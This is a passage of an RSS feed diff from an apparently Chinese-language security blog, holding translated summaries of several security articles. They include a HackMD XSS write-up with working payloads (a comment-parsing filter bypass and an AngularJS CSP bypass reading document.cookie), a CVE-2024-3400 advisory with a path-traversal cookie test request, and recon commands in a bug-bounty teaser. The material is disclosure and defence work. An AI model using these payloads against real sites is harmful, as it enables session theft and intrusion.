+        <link>http://localhost:1313/p/mapp-%E8%AE%A1%E5%88%92%E6%9B%B4%E6%96%B0%E9%99%8D%E4%BD%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E9%A3%8E%E9%99%A9%E7%9A%84%E8%A1%8C%E5%8A%A8%E6%8E%AA%E6%96%BD/</link>
+        <pubDate>Wed, 06 Aug 2025 04:51:04 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/mapp-%E8%AE%A1%E5%88%92%E6%9B%B4%E6%96%B0%E9%99%8D%E4%BD%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E9%A3%8E%E9%99%A9%E7%9A%84%E8%A1%8C%E5%8A%A8%E6%8E%AA%E6%96%BD/</guid>
+        <description>&lt;h3 id=&#34;mapp-计划更新降低信息泄露风险的行动措施&#34;&gt;MAPP 计划更新：降低信息泄露风险的行动措施
+&lt;/h3&gt;&lt;p&gt;在我们对微软主动保护计划（MAPP）合作伙伴共享机密数据泄露事件的调查中，确认杭州迪普科技有限公司违反了保密协议（NDA）。微软对违反NDA的行为采取零容忍态度，已将该合作伙伴从MAPP计划中除名。&lt;/p&gt;
+&lt;p&gt;此外，自5月版本起，我们强化了现有控制措施并采取新行动以加强信息保护。这些改进措施既能更好地保护微软的信息安全，又能通过协助合作伙伴开发主动防护机制来增强客户保护。如需了解MAPP如何为防御者提供关键先机并降低风险，请参阅MAPP团队的&lt;a class=&#34;link&#34; href=&#34;https://msrc.microsoft.com/blog&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;技术博客&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Yunsun Wee&lt;/strong&gt;&lt;br&gt;
+总监&lt;br&gt;
+微软可信计算部门&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>安全设计为何必须前置：从非对称加密到多因素认证的技术演进</title>
+        <link>http://localhost:1313/p/%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1%E4%B8%BA%E4%BD%95%E5%BF%85%E9%A1%BB%E5%89%8D%E7%BD%AE%E4%BB%8E%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E5%88%B0%E5%A4%9A%E5%9B%A0%E7%B4%A0%E8%AE%A4%E8%AF%81%E7%9A%84%E6%8A%80%E6%9C%AF%E6%BC%94%E8%BF%9B/</link>
+        <pubDate>Wed, 06 Aug 2025 04:34:54 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1%E4%B8%BA%E4%BD%95%E5%BF%85%E9%A1%BB%E5%89%8D%E7%BD%AE%E4%BB%8E%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E5%88%B0%E5%A4%9A%E5%9B%A0%E7%B4%A0%E8%AE%A4%E8%AF%81%E7%9A%84%E6%8A%80%E6%9C%AF%E6%BC%94%E8%BF%9B/</guid>
+        <description>&lt;p&gt;当WiKID初创时，我们深知必须达到或超越当时主流安全方案（如RSA和Vasco）的防护等级。我们认定在用户设备端生成非对称密钥是消除软件令牌质疑的最佳方案——毕竟RSA三人组发明公钥加密正是为了克服共享密钥的固有缺陷。&lt;/p&gt;
+&lt;p&gt;然而时至今日，主流消费者双因素认证仍采用基于共享密钥的&amp;quot;两步验证&amp;quot;（即便发生过重大供应商密钥泄露事件），甚至更脆弱的短信验证。这似乎印证了&amp;quot;营销胜过技术&amp;quot;的定律，市场对非对称加密的增强安全性始终兴趣寥寥。&lt;/p&gt;
+&lt;p&gt;但安全领域存在特殊规律：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;攻击手段持续进化&lt;/li&gt;
+&lt;li&gt;合规要求可能强制市场变革&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;PCI-DSS委员会最新指南正推动这种变革，明确指出多步验证会导致账户信息泄露，应予以弃用。NIST也已将短信验证列为过时机制。&lt;/p&gt;
+&lt;p&gt;这对系统管理员反而是种简化。多数VPN和远程访问服务默认通过RADIUS支持基于OTP的双因素认证（同时支持AD/LDAP授权），且根本不兼容多步验证流程。例如在Cisco ASA设备上就无法配置两步验证。但双因素认证却能轻松集成到ASA管理员账户——这不仅是绝佳实践，也即将成为PCI非控制台管理访问的强制要求。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>HackMD中的可蠕虫化XSS漏洞分析</title>
+        <link>http://localhost:1313/p/hackmd%E4%B8%AD%E7%9A%84%E5%8F%AF%E8%A0%95%E8%99%AB%E5%8C%96xss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+        <pubDate>Wed, 06 Aug 2025 04:18:37 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/hackmd%E4%B8%AD%E7%9A%84%E5%8F%AF%E8%A0%95%E8%99%AB%E5%8C%96xss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h1 id=&#34;可蠕虫化的hackmd-xss漏洞&#34;&gt;可蠕虫化的HackMD XSS漏洞
+&lt;/h1&gt;&lt;p&gt;在Web安全领域，我通常更偏爱服务器端漏洞而非客户端漏洞（当然能直接获取shell的客户端漏洞除外XD）。控制他人服务器对我来说更有趣！正因如此，我以往较少关注XSS和CSRF等客户端漏洞（翻看记录只有2018年Google CTF那篇）。但这次发现的漏洞相当有趣，本着教育（和炫耀？）的心态决定撰文分享。&lt;/p&gt;
+&lt;h2 id=&#34;背景介绍&#34;&gt;背景介绍
+&lt;/h2&gt;&lt;p&gt;HackMD是一款台湾开发者打造的Markdown协作平台，被COSCUP、g0v、HITCON等台湾技术会议用作官方协作文档平台，甚至还是Ethereum的官方协作工具。其源代码已在GitHub开源（获得4500+星），在中国和欧洲也拥有大量用户。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞发现&#34;&gt;漏洞发现
+&lt;/h2&gt;&lt;p&gt;在审查HackMD前端Markdown渲染的XSS防护机制时，发现其使用npm/xss库进行HTML过滤。关键在于&lt;code&gt;onIgnoreTag&lt;/code&gt;回调函数中对HTML注释标签的处理：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;onIgnoreTag&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;tag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;tag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;!--&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 不过滤其属性
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;开发者本意是保留注释内容，但我们可以构造特殊注释来污染DOM：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;&amp;lt;!-- foo=&amp;#34;bar--&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Hi&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&amp;#34; --&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;csp绕过技术&#34;&gt;CSP绕过技术
+&lt;/h2&gt;&lt;p&gt;HackMD实施了严格的内容安全策略(CSP)，但存在两个关键弱点：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;允许&lt;code&gt;unsafe-eval&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;允许从cdnjs.cloudflare.com加载脚本&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;利用AngularJS 1.0.8的客户端模板注入功能，我们成功绕过CSP：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;&amp;lt;!-- foo=&amp;#34;--&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;ng-app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    {{constructor.constructor(&amp;#39;alert(document.cookie)&amp;#39;)()}}
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//sssss&amp;#34; --&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;蠕虫攻击效果&#34;&gt;蠕虫攻击效果
+&lt;/h2&gt;&lt;p&gt;当攻击者与其他用户同时编辑文档时，可对所有查看者执行恶意代码，实现类似Samy Worm的蠕虫传播效果。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;该漏洞已在CodiMD最新版修复，详情参见相关pull request。&lt;/p&gt;&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
+        <title>为内部OTS硬件设备配置TLS证书的技术方案</title>
+        <link>http://localhost:1313/p/%E4%B8%BA%E5%86%85%E9%83%A8ots%E7%A1%AC%E4%BB%B6%E8%AE%BE%E5%A4%87%E9%85%8D%E7%BD%AEtls%E8%AF%81%E4%B9%A6%E7%9A%84%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/</link>
+        <pubDate>Wed, 06 Aug 2025 03:56:51 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E4%B8%BA%E5%86%85%E9%83%A8ots%E7%A1%AC%E4%BB%B6%E8%AE%BE%E5%A4%87%E9%85%8D%E7%BD%AEtls%E8%AF%81%E4%B9%A6%E7%9A%84%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/</guid>
+        <description>&lt;h1 id=&#34;为内部ots硬件设备配置tls证书&#34;&gt;为内部OTS硬件设备配置TLS证书
+&lt;/h1&gt;&lt;p&gt;很久以前，一位客户请我测试一款接入家庭网络提供服务的硬件设备。该设备通常通过HTTP的Web界面进行管理。测试时正值Chrome即将更新，新版本会突出显示HTTP访问和提交内容的安全风险。我与客户讨论了这一变化，询问他们是否有应对计划。&lt;/p&gt;
+&lt;p&gt;他们考虑过使用自签名证书，但这同样会显示安全警告，迫使用户忽略警告接受证书。由于该硬件旨在增强网络安全，这种做法显然不妥。&lt;/p&gt;
+&lt;p&gt;为此，我与TLS专家Scott Helme讨论后，设计出以下工作流程，使内部设备能获得有效的TLS证书。&lt;/p&gt;
+&lt;h2 id=&#34;参与方&#34;&gt;参与方
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;OTS&lt;/strong&gt;：需要证书的现成硬件设备&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;HQ&lt;/strong&gt;：制造商&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;LE&lt;/strong&gt;：Let&amp;rsquo;s Encrypt&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;设置&#34;&gt;设置
+&lt;/h2&gt;&lt;p&gt;制造商需要拥有一个专门用于OTS设备的域名，例如主域为ots.space，可使用ots-cert.space作为设备域。&lt;/p&gt;
+&lt;h2 id=&#34;工作流程&#34;&gt;工作流程
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;OTS首次启动时生成随机令牌，并通过HTTPS将其与IP地址发送给HQ。&lt;/li&gt;
+&lt;li&gt;HQ为设备生成唯一名称（如nifty-babbage）。&lt;/li&gt;
+&lt;li&gt;HQ在设备域上为设备名称创建DNS记录（如nifty-babbage.ots-cert.space A 192.168.0.7）。&lt;/li&gt;
+&lt;li&gt;HQ将名称返回给OTS。&lt;/li&gt;
+&lt;li&gt;OTS生成私钥和CSR，发送给HQ。&lt;/li&gt;
+&lt;li&gt;HQ使用CSR和LE的DNS验证为子域名生成证书。&lt;/li&gt;
+&lt;li&gt;HQ创建包含证书和认证令牌的包。&lt;/li&gt;
+&lt;li&gt;OTS轮询HQ检查包是否就绪，使用初始令牌作为标识。下载包后安装证书，并设置HTTP到HTTPS的重定向（如http://192.168.0.7重定向到https://nifty-babbage.ots-cert.space）。&lt;/li&gt;
+&lt;li&gt;OTS每天检查证书有效期，到期前7天使用认证令牌请求新证书。设备重启时也执行此流程。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;注意事项&#34;&gt;注意事项
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;LE证书会提交到证书透明度日志，可能暴露设备名称，但无法关联到具体用户。&lt;/li&gt;
+&lt;li&gt;设备名称可自定义，但可能增加信息泄露风险。&lt;/li&gt;
+&lt;li&gt;LE证书有效期为90天，设备长期离线后启动时会自动更新证书。&lt;/li&gt;
+&lt;li&gt;对于DHCP网络，IP变化时可更新DNS记录，短TTL可减少问题。&lt;/li&gt;
+&lt;li&gt;为防止DDoS，每日任务应随机时间执行。&lt;/li&gt;
+&lt;li&gt;生产时可预装客户端证书替代随机令牌，但需考虑长期有效性。&lt;/li&gt;
+&lt;li&gt;私钥仅在OTS生成，不会通过网络传输。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;概念验证&#34;&gt;概念验证
+&lt;/h2&gt;&lt;p&gt;本文提供了完整可运行的概念验证，设置简单，易于实施。&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;%e6%bc%94%e7%a4%ba%e9%93%be%e6%8e%a5&#34; &gt;查看演示&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>PAN-OS CVE-2024-3400高危漏洞：请立即修补您的Palo Alto防火墙</title>
+        <link>http://localhost:1313/p/pan-os-cve-2024-3400%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E8%AF%B7%E7%AB%8B%E5%8D%B3%E4%BF%AE%E8%A1%A5%E6%82%A8%E7%9A%84palo-alto%E9%98%B2%E7%81%AB%E5%A2%99/</link>
+        <pubDate>Wed, 06 Aug 2025 03:40:23 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/pan-os-cve-2024-3400%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E8%AF%B7%E7%AB%8B%E5%8D%B3%E4%BF%AE%E8%A1%A5%E6%82%A8%E7%9A%84palo-alto%E9%98%B2%E7%81%AB%E5%A2%99/</guid>
+        <description>&lt;h2 id=&#34;概述&#34;&gt;概述
+&lt;/h2&gt;&lt;p&gt;CVE-2024-3400是PAN-OS系统中的高危漏洞，攻击者可通过GlobalProtect VPN接口利用目录遍历+命令注入的组合攻击链，实现预认证远程代码执行。尽管补丁已发布，但该漏洞目前已被野外利用。Bishop Fox在公开漏洞验证程序(PoC)发布前就开发了内部利用程序并通知了客户。值得注意的是，我们成功绕过了Palo Alto Networks提供的临时缓解措施。&lt;/p&gt;
+&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
+&lt;/h2&gt;&lt;p&gt;该漏洞允许通过HTTP cookie注入有效载荷，将其作为文件名写入受控位置（通过目录遍历实现）。后续该文件会被包含命令注入漏洞的遥测脚本通过cron作业处理，最终实现root权限的带外远程代码执行。需特别说明的是，Bash命令被包含在上述文件的文件名而非文件内容中。&lt;/p&gt;
+&lt;h2 id=&#34;缓解措施绕过&#34;&gt;缓解措施绕过
+&lt;/h2&gt;&lt;p&gt;Palo Alto Networks最初建议两种临时缓解措施：启用威胁防护和禁用设备遥测功能。我们成功绕过了这两种措施：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;通过特定技术规避了威胁防护的签名检测&lt;/li&gt;
+&lt;li&gt;发现了新的命令注入漏洞（在遥测功能禁用时仍可被利用）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;最新版的威胁防护规则(TIDs 95187/95189/95191)是有效的临时解决方案，但我们发现多起因配置错误导致规则失效的案例。可通过以下安全HTTP请求测试规则是否生效：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ curl -k https://&amp;lt;HOST&amp;gt;/ -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;Cookie: test=../../&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;配置正确的系统会返回&amp;quot;connection reset&amp;quot;，错误配置则会返回HTML响应。&lt;/p&gt;
+&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
+&lt;/h2&gt;&lt;p&gt;按有效性排序的修复方案：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;立即安装补丁（新增了对会话cookie的严格验证）&lt;/li&gt;
+&lt;li&gt;启用威胁防护规则95187/95189/95191&lt;/li&gt;
+&lt;li&gt;临时下线GlobalProtect接口&lt;/li&gt;
+&lt;li&gt;部署额外IPS规则拦截HTTP Cookie头中包含&amp;quot;../&amp;ldquo;的请求&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        </item>
+        <item>
+        <title>藏在会话中的秘密：一个被遗忘的Cookie如何让我像主人一样走进管理员面板</title>
+        <link>http://localhost:1313/p/%E8%97%8F%E5%9C%A8%E4%BC%9A%E8%AF%9D%E4%B8%AD%E7%9A%84%E7%A7%98%E5%AF%86%E4%B8%80%E4%B8%AA%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84cookie%E5%A6%82%E4%BD%95%E8%AE%A9%E6%88%91%E5%83%8F%E4%B8%BB%E4%BA%BA%E4%B8%80%E6%A0%B7%E8%B5%B0%E8%BF%9B%E7%AE%A1%E7%90%86%E5%91%98%E9%9D%A2%E6%9D%BF/</link>
+        <pubDate>Wed, 06 Aug 2025 03:34:34 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E8%97%8F%E5%9C%A8%E4%BC%9A%E8%AF%9D%E4%B8%AD%E7%9A%84%E7%A7%98%E5%AF%86%E4%B8%80%E4%B8%AA%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84cookie%E5%A6%82%E4%BD%95%E8%AE%A9%E6%88%91%E5%83%8F%E4%B8%BB%E4%BA%BA%E4%B8%80%E6%A0%B7%E8%B5%B0%E8%BF%9B%E7%AE%A1%E7%90%86%E5%91%98%E9%9D%A2%E6%9D%BF/</guid>
+        <description>&lt;h1 id=&#34;-藏在会话中的秘密一个被遗忘的cookie如何让我像主人一样走进管理员面板-&#34;&gt;🍪 藏在会话中的秘密：一个被遗忘的Cookie如何让我像主人一样走进管理员面板 🔑
+&lt;/h1&gt;&lt;p&gt;凌晨2:47，我正喝着第三杯咖啡（也就是所谓的&amp;quot;应对机制&amp;quot;☕），一边看着2008年的CTF演讲视频，一边浏览着某个金融科技目标的侦察输出。就在我准备放弃今晚的工作时，我注意到了一些奇怪的东西 - 一个在欺骗我的注销端点。当注销按钮说谎时，你最好相信它背后藏着宝藏。&lt;/p&gt;
+&lt;p&gt;这是一个关于我如何偶然发现一个仍停留在过去的被遗忘Cookie的故事 - 以及这个Cookie如何给我完整管理员权限的故事。&lt;/p&gt;
+&lt;h2 id=&#34;-侦察仪式与cookie碎屑&#34;&gt;🔍 侦察仪式与Cookie碎屑
+&lt;/h2&gt;&lt;p&gt;我从基本的批量侦察开始 - 没什么特别的：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;subfinder -d target.com | tee subs.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;httpx -l subs.txt -status-code -title -tech-detect &amp;gt; alive.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gau...
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;谁需要管理员权限当你有graphql时滥用查询获取乐趣和数据-&#34;&gt;谁需要管理员权限？当你有GraphQL时：滥用查询获取乐趣和数据 🌝📊
+&lt;/h2&gt;&lt;p&gt;（文章内容继续&amp;hellip;）&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>防御安全播客第291期：从Tenable插件故障到AI钓鱼邮件的技术剖析</title>
+        <link>http://localhost:1313/p/%E9%98%B2%E5%BE%A1%E5%AE%89%E5%85%A8%E6%92%AD%E5%AE%A2%E7%AC%AC291%E6%9C%9F%E4%BB%8Etenable%E6%8F%92%E4%BB%B6%E6%95%85%E9%9A%9C%E5%88%B0ai%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%89%96%E6%9E%90/</link>
+        <pubDate>Wed, 06 Aug 2025 02:07:08 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E9%98%B2%E5%BE%A1%E5%AE%89%E5%85%A8%E6%92%AD%E5%AE%A2%E7%AC%AC291%E6%9C%9F%E4%BB%8Etenable%E6%8F%92%E4%BB%B6%E6%95%85%E9%9A%9C%E5%88%B0ai%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%89%96%E6%9E%90/</guid>
+        <description>&lt;h3 id=&#34;技术要点讨论&#34;&gt;技术要点讨论
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Tenable插件更新事故&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;全球Nessus代理因恶意插件更新大规模瘫痪&lt;/li&gt;
+&lt;li&gt;事故根源分析与供应链安全启示&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
